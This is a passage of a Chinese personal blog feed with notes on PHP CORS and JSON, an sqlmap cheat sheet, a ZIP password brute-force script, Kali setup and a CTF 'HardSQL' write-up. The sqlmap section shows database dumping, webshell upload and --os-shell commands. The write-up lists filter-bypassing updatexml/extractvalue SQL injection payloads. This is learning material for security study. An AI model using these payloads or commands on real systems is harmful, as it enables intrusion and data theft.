class="hljs-comment"># 此处设置任意源均可访问</span><br>header(<span class="hljs-string">&quot;Access-Control-Allow-Origin: *&quot;</span>);<br><span class="hljs-comment"># 此处应该是设置可以返回的header信息</span><br>header(<span class="hljs-string">&quot;Access-Control-Allow-Headers: Content-Type&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>之后就可以使用该api了</p></blockquote></li><li><p>使用php读取json形式的post请求</p><blockquote><p>因为不是默认的形式所以需要其它形式进行读取</p><p>具体内容如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># 获取传入的json信息</span><br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>]; <br><span class="hljs-comment"># 将传入的json转换为对象</span><br><span class="hljs-variable">$all</span>=json_decode(<span class="hljs-variable">$post</span>);<br></code></pre></div></td></tr></table></figure><p>此时已经可以通过$all-&gt;name进行获取信息了</p></blockquote></li><li><p>返回信息的处理</p><blockquote><p>本来想使用类编写后输出，但是编写之后就无法访问</p><p>尝试其它方法后发现可以通过一下方法进行创建对象</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$re</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$re</span>-&gt;code=<span class="hljs-number">201</span>;<br><span class="hljs-variable">$re</span>-&gt;msg=<span class="hljs-string">&quot;您输入的账户或密码错误！&quot;</span>;<br><span class="hljs-comment"># 最后的输出为</span><br><span class="hljs-keyword">echo</span> json_encode(<span class="hljs-variable">$re</span>);<br></code></pre></div></td></tr></table></figure></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>Vue Vue+Element</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2021/06/11/%E4%BF%A1%E5%AE%89/Tools/sqlmap/"/>
    <url>/2021/06/11/%E4%BF%A1%E5%AE%89/Tools/sqlmap/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmap基础"><a href="#sqlmap基础" class="headerlink" title="sqlmap基础"></a>sqlmap基础</h1><h1 id="基础GET使用"><a href="#基础GET使用" class="headerlink" title="基础GET使用"></a>基础GET使用</h1><h2 id="检查注入点："><a href="#检查注入点：" class="headerlink" title="检查注入点："></a>检查注入点：</h2><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11</p><h2 id="爆所有数据库信息："><a href="#爆所有数据库信息：" class="headerlink" title="爆所有数据库信息："></a>爆所有数据库信息：</h2><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 –dbs</p><h2 id="爆当前数据库信息："><a href="#爆当前数据库信息：" class="headerlink" title="爆当前数据库信息："></a>爆当前数据库信息：</h2><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 –current-db</p><h2 id="指定库名列出所有表"><a href="#指定库名列出所有表" class="headerlink" title="指定库名列出所有表"></a>指定库名列出所有表</h2><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 –tables</p><p>‘vhost48330’ 为指定数据库名称</p><h2 id="指定库名表名列出所有字段"><a href="#指定库名表名列出所有字段" class="headerlink" title="指定库名表名列出所有字段"></a>指定库名表名列出所有字段</h2><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 -T admin –columns<br> ‘admin’ 为指定表名称</p><h2 id="指定库名表名字段dump出指定字段"><a href="#指定库名表名字段dump出指定字段" class="headerlink" title="指定库名表名字段dump出指定字段"></a>指定库名表名字段dump出指定字段</h2><p>sqlmap -u <a href="https://link.jianshu.com/?t=http://aa.com/star_photo.php?artist_id">http://aa.com/star_photo.php?artist_id</a>＝11 -D vhost48330 -T admin -C ac，id，password –dump<br> ‘ac,id,password’ 为指定字段名称</p><h1 id="POST使用"><a href="#POST使用" class="headerlink" title="POST使用"></a>POST使用</h1><p>sqlmap -r “tmp.txt” –dbs</p><p>其后一样</p><h1 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h1><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br>#示例：<br>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p><h1 id="使用shell命令："><a href="#使用shell命令：" class="headerlink" title="使用shell命令："></a>使用shell命令：</h1><p>sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell<br>接下来指定网站可写目录：<br>“E:\php\htdocs\dvwa”</p><p>#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）<br>sqlmap详细命令：</p><div class="hljs code-wrapper"><pre><code>–is-dba 当前用户权限（是否为root权限）–dbs 所有数据库–current-db 网站当前数据库–users 所有数据库用户–current-user 当前数据库用户–random-agent 构造随机user-agent–passwords 数据库密码–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</code></pre></div><h1 id="Options（选项）："><a href="#Options（选项）：" class="headerlink" title="Options（选项）："></a>Options（选项）：</h1><div class="hljs code-wrapper"><pre><code>–version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）保存进度继续跑：</code></pre></div><p>sqlmap -u “<a href="http://url/news?id=1%E2%80%9C">http://url/news?id=1“</a> –dbs-o “sqlmap.log” 保存进度<br>sqlmap -u “<a href="http://url/news?id=1%E2%80%9C">http://url/news?id=1“</a> –dbs-o “sqlmap.log” –resume 恢复已保存进度<br>Target（目标）：</p><p>以下至少需要设置其中一个选项，设置目标URL。</p><div class="hljs code-wrapper"><pre><code>-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。</code></pre></div><p>Request（请求）：</p><p>这些选项可以用来指定如何连接到目标URL。</p><div class="hljs code-wrapper"><pre><code>–data=DATA 通过POST发送的数据字符串–cookie=COOKIE HTTP Cookie头–cookie-urlencode URL 编码生成的cookie注入–drop-set-cookie 忽略响应的Set – Cookie头信息–user-agent=AGENT 指定 HTTP User – Agent头–random-agent 使用随机选定的HTTP User – Agent头–referer=REFERER 指定 HTTP Referer头–headers=HEADERS 换行分开，加入其他的HTTP头–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）–auth-cert=ACERT HTTP认证证书（key_file，cert_file）–proxy=PROXY 使用HTTP代理连接到目标URL–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）–ignore-proxy 忽略系统默认的HTTP代理–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）–retries=RETRIES 连接超时后重新连接的时间（默认3）–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式–safe-url=SAFURL 在测试过程中经常访问的url地址–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</code></pre></div><p>Enumeration（枚举）：</p><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br>您自己的SQL语句。</p><div class="hljs code-wrapper"><pre><code>-b, –banner 检索数据库管理系统的标识–current-user 检索数据库管理系统当前用户–current-db 检索数据库管理系统当前数据库–is-dba 检测DBMS当前用户是否DBA–users 枚举数据库管理系统用户–passwords 枚举数据库管理系统用户密码哈希–privileges 枚举数据库管理系统用户的权限–roles 枚举数据库管理系统用户的角色–dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）–tables 枚举的DBMS数据库中的表–columns 枚举DBMS数据库表列–dump 转储数据库管理系统的数据库中的表项–dump-all 转储所有的DBMS数据库表中的条目–search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户–exclude-sysdbs 枚举表时排除系统数据库–start=LIMITSTART 第一个查询输出进入检索–stop=LIMITSTOP 最后查询的输出进入检索–first=FIRSTCHAR 第一个查询输出字的字符检索–last=LASTCHAR 最后查询的输出字字符检索–sql-query=QUERY 要执行的SQL语句–sql-shell 提示交互式SQL的shell</code></pre></div><p>Optimization（优化）：</p><p>这些选项可用于优化SqlMap的性能。</p><div class="hljs code-wrapper"><pre><code>-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</code></pre></div><p>Injection（注入）：</p><p>这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。</p><div class="hljs code-wrapper"><pre><code>-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</code></pre></div><p>Detection（检测）：</p><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。</p><div class="hljs code-wrapper"><pre><code>–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页</code></pre></div><p>Techniques（技巧）：</p><p>这些选项可用于调整具体的SQL注入测试。</p><div class="hljs code-wrapper"><pre><code>–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符</code></pre></div><p>Fingerprint（指纹）：</p><div class="hljs code-wrapper"><pre><code>-f, –fingerprint 执行检查广泛的DBMS版本指纹</code></pre></div><p>Brute force（蛮力）：</p><p>这些选项可以被用来运行蛮力检查。</p><div class="hljs code-wrapper"><pre><code>–common-tables 检查存在共同表–common-columns 检查存在共同列</code></pre></div><p>User-defined function injection（用户自定义函数注入）：<br>这些选项可以用来创建用户自定义函数。</p><p>–udf-inject 注入用户自定义函数<br>–shared-lib=SHLIB 共享库的本地路径<br>File system access（访问文件系统）：</p><p>这些选项可以被用来访问后端数据库管理系统的底层文件系统。</p><div class="hljs code-wrapper"><pre><code>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</code></pre></div><p>Operating system access（操作系统访问）：</p><p>这些选项可以用于访问后端数据库管理系统的底层操作系统。</p><div class="hljs code-wrapper"><pre><code>–os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径</code></pre></div><h2 id="Windows注册表访问："><a href="#Windows注册表访问：" class="headerlink" title="Windows注册表访问："></a>Windows注册表访问：</h2><p>这些选项可以被用来访问后端数据库管理系统Windows注册表。</p><div class="hljs code-wrapper"><pre><code>–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型</code></pre></div><p>这些选项可以用来设置一些一般的工作参数。</p><div class="hljs code-wrapper"><pre><code>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。</code></pre></div><h2 id="Miscellaneous（杂项）"><a href="#Miscellaneous（杂项）" class="headerlink" title="Miscellaneous（杂项）"></a>Miscellaneous（杂项）</h2><div class="hljs code-wrapper"><pre><code>–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>信安 Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爆破压缩的密码</title>
    <link href="/2021/06/03/Python/%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E7%9A%84%E5%AF%86%E7%A0%81/"/>
    <url>/2021/06/03/Python/%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E7%9A%84%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="爆破压缩密码脚本"><a href="#爆破压缩密码脚本" class="headerlink" title="爆破压缩密码脚本"></a>爆破压缩密码脚本</h1><p>Python 的标准库提供了 ZIP 文件的提取压缩模块 zipfile，现在让我们试着用这个模块，暴力破解出加密的 ZIP 文件！我们可以用extractall()这个函数抽取文件，密码正确则返回正确，密码错误测抛出异常。</p><p>注意rarfile需要导入pip install rarfile</p><p>另外破解rar需要导入相应的解压包 winrar中的unrar.exe文件</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> path<br><span class="hljs-keyword">import</span> zipfile,time,threading,rarfile<br><br><span class="hljs-comment"># zfile=zipfile.ZipFile(&quot;Python\\TMP\\1.zip&quot;,&quot;r&quot;)</span><br><span class="hljs-comment"># zfile.extractall(path=&quot;.&quot;,pwd=&quot;2&quot;.encode(&quot;utf-8&quot;))</span><br><br> <br>start_time = time.time()<br>flag = <span class="hljs-literal">True</span> <span class="hljs-comment"># 用于判断线程是否需要终止，为True时程序执行</span><br>s=<span class="hljs-string">&quot;0123456789&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract</span>(<span class="hljs-params">password, file</span>):</span><br>  <span class="hljs-keyword">try</span>:<br>    password = <span class="hljs-built_in">str</span>(password)<br>    file.extractall(path=<span class="hljs-string">&#x27;.&#x27;</span>, pwd=password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;当前压缩密码为：&quot;</span>,password)<br>    end_time = time.time()<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;多线程破解压缩包花了%s秒&#x27;</span>%(end_time-start_time))<br>    <span class="hljs-keyword">global</span> flag<br>    flag = <span class="hljs-literal">False</span><span class="hljs-comment">#成功解压其余线程终止</span><br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>  zfile = zipfile.ZipFile(<span class="hljs-string">&quot;Python\\TMP\\00000000.zip&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>  <span class="hljs-comment"># 仅需要替换为rarfile.RarFile即可</span><br>  pw=<span class="hljs-string">&quot;&quot;</span><br>  one=<span class="hljs-literal">True</span><br>  <span class="hljs-keyword">for</span> i1 <span class="hljs-keyword">in</span> s:<br>    <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">for</span> i3 <span class="hljs-keyword">in</span> s:<br>            <span class="hljs-keyword">for</span> i4 <span class="hljs-keyword">in</span> s:<br>                pw=<span class="hljs-string">&quot;&quot;</span><br>                pw=pw+i1+i2+i3+i4<br>                thr1=threading.Thread(target=extract,args=(pw,zfile))<br>                thr1.start()<br>                thr1.join()<br><span class="hljs-comment">#   for number in range(1,99999,1):</span><br><span class="hljs-comment">#     if flag:</span><br><span class="hljs-comment">#       thr1 = threading.Thread(target=extract, args=(number, zfile))</span><br><span class="hljs-comment">#       thr2 = threading.Thread(target=extract, args=(number, zfile))</span><br>       <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  main()<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>解压</tag>
      
      <tag>爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali基础配置</title>
    <link href="/2021/06/03/Kali/%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/06/03/Kali/%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Kali-换源"><a href="#Kali-换源" class="headerlink" title="Kali 换源"></a>Kali 换源</h1><p>进入相应的目录 /etc/apt</p><p>对sources.list使用管理员权限进行修改</p><blockquote><p>#kali官方源<br>   deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>   #中科大的源<br>   deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>   deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main contrib non-free<br>   deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main contrib non-free<br>   deb <a href="http://mirrors.ustc.edu.cn/kali-security">http://mirrors.ustc.edu.cn/kali-security</a> kali-current/updates main contrib non-free<br>   deb-src <a href="http://mirrors.ustc.edu.cn/kali-security">http://mirrors.ustc.edu.cn/kali-security</a> kali-current/updates main contrib non-free<br>   #阿里云源<br>   deb <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>   deb <a href="http://mirrors.aliyun.com/kali-security/">http://mirrors.aliyun.com/kali-security/</a> kali-rolling main contrib non-free<br>   deb-src <a href="http://mirrors.aliyun.com/kali-security/">http://mirrors.aliyun.com/kali-security/</a> kali-rolling main contrib non-free<br>  #阿里云<br>deb <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib deb-src <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>#清华大学<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>#浙大<br>deb <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free deb-src <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>#东软大学<br>deb <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib deb-src <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib</p></blockquote><h1 id="安装输入法"><a href="#安装输入法" class="headerlink" title="安装输入法"></a>安装输入法</h1><p>首先更新<code>apt-get update</code>和<code>apt-get upgrade</code></p><p>之后安装输入法<code>apt-get install ibus ibus-pinyin</code>设置对应输入法<code>im-config</code></p><p>重启即可</p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杂记</title>
    <link href="/2021/06/03/%E4%BF%A1%E5%AE%89/CTF/Misc/%E6%9D%82%E8%AE%B0/"/>
    <url>/2021/06/03/%E4%BF%A1%E5%AE%89/CTF/Misc/%E6%9D%82%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="记录一下Misc相关的小知识"><a href="#记录一下Misc相关的小知识" class="headerlink" title="记录一下Misc相关的小知识"></a>记录一下Misc相关的小知识</h1><h1 id="Misc-convert分离gif、montage图片拼接"><a href="#Misc-convert分离gif、montage图片拼接" class="headerlink" title="Misc(convert分离gif、montage图片拼接)"></a>Misc(convert分离gif、montage图片拼接)</h1><p>分离的命令 convert **.gif **.png</p><p>拼接的命令 </p><blockquote><p>用命令：montage flag*.png -tile x1 -geometry +0+0 flag.png</p><p>-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</p><p>-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可</p></blockquote><h1 id="图片分析"><a href="#图片分析" class="headerlink" title="图片分析"></a>图片分析</h1><p> 当我们使用这行命令后，binwalk就会自动分析这个jpg文件：</p><blockquote><p>binwalk **.jpg</p></blockquote><p>使用foremost，你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为：</p><blockquote><p>foremost carter.jpg</p></blockquote><p> 当我们使用这行命令后，foremost会自动生成output目录存放分离出文件：</p><h1 id="Python-爆破zip密码"><a href="#Python-爆破zip密码" class="headerlink" title="Python 爆破zip密码"></a>Python 爆破zip密码</h1><p>主要代码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 第一个表示解压后的路径第二个表示密码</span><br>file.extractall(path=<span class="hljs-string">&#x27;.&#x27;</span>, pwd=password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019_HardSQL 1</title>
    <link href="/2021/06/02/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHardSQL%201/"/>
    <url>/2021/06/02/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHardSQL%201/</url>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-HardSQL1"><a href="#极客大挑战-2019-HardSQL1" class="headerlink" title="[极客大挑战 2019]HardSQL1"></a>[极客大挑战 2019]HardSQL1</h1><h1 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h1><p>尝试输入内容后返回的都是错误密码界面,部分界面为被过滤样式</p><p>考虑报错注入</p><h2 id="判断过滤的内容"><a href="#判断过滤的内容" class="headerlink" title="判断过滤的内容"></a>判断过滤的内容</h2><p>模糊测试后发现过滤如下内容</p><blockquote><p>空格,and,ascii,substr,by,if,!,&amp;,*,+,=,,|,||,And,&lt;,&amp;&amp;</p></blockquote><h1 id="之后尝试"><a href="#之后尝试" class="headerlink" title="之后尝试"></a>之后尝试</h1><p>报错注入使用()绕过空格</p><p>(updatexml(1,concat(0x7e,(select(database())),0x7e),1))%23<br>(updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1))%23<br>(updatexml(1,concat(0x7e,(select(group_concat(right(schema_name,10)))from(information_schema.schemata)),0x7e),1))%23<br>(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(‘geek’))),0x7e),1))%23<br>(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_schema)like(‘geek’))),0x7e),1))%23<br>(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23<br>(updatexml(1,concat(0x7e,(select(group_concat(right(password,24)))from(H4rDsq1)),0x7e),1))%23</p><p>最后获得flag</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ol><li><p>查不全时可用left(),right(),例子如下:数字表示显示最右边的多少个group_concat((right(password,25)))</p></li><li><p>报错注入只要套用公式即可，公式如下(第一个公式count(<em>)、floor()、rand()、group by<br>不可或缺，后两个公式有32位的限制):<br>?id=2’ and (select 1 from (select count(</em>),concat( floor(rand(0)*2),(select (se<br>lect (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )–+</p><p>+++++++++++++++++++</p><p>?id=2’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)–+</p><p>+++++++++++</p><p>?id=1’ and extractvalue(1, concat(0x7e, (select @@version),0x7e))–+</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>横屏播放</title>
    <link href="/2021/05/31/AndroidStudio/%E8%A7%86%E9%A2%91/ExoPlayer/%E6%A8%AA%E5%B1%8F%E6%92%AD%E6%94%BE/"/>
    <url>/2021/05/31/AndroidStudio/%E8%A7%86%E9%A2%91/ExoPlayer/%E6%A8%AA%E5%B1%8F%E6%92%AD%E6%94%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="基本实现横屏播放"><a href="#基本实现横屏播放" class="headerlink" title="基本实现横屏播放"></a>基本实现横屏播放</h1><h1 id="重要配置文件"><a href="#重要配置文件" class="headerlink" title="重要配置文件"></a>重要配置文件</h1><p>AndroidManifest</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">uses-permission</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span>       <br><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.Activity.VideoActivity&quot;</span>  <span class="hljs-attr">android:configChanges</span>=<span class="hljs-string">&quot;orientation|screenSize&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="增加自定义按钮"><a href="#增加自定义按钮" class="headerlink" title="增加自定义按钮"></a>增加自定义按钮</h1><p>layout</p><p>main</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div 